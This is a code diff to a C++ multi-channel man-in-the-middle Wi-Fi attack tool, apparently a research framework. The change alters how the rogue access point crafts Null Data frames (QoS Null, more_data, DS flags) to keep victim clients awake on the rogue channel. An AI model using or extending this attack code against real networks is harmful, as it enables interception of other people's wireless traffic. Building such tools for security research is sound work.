@@ -1,3 +1,5 @@
+#include <reproc++/drain.hpp>
+
 #include "attacks/mc_mitm/mc_mitm.h"
 
 #include <tins/tins.h>
@@ -136,8 +138,14 @@ void McMitm::power_mgmt_response_rogue(HWAddress<6> addr2, Dot11 &dot11) const {
 
 	log(LogLevel::WARNING, "Client {} is going to sleep on rogue channel. reply with Null Data", addr2);
 	Dot11Data null_frame(addr2, HWAddress<6>(rogue_ap.get(SK::mac)));
-	null_frame.subtype(Dot11::DATA_NULL);
 	null_frame.addr3(HWAddress<6>(rogue_ap.get(SK::mac)));
+	null_frame.from_ds(1);
+	null_frame.to_ds(0);
+	//TODO still issue with client get to sleep right after ACK -> this can be slow
+	// add test fro this ?
+	//null_frame.subtype(Dot11::DATA_NULL);
+	null_frame.subtype(Dot11::QOS_DATA_NULL);
+	null_frame.more_data(1);
 	send_to_rogue(null_frame);
 }
 
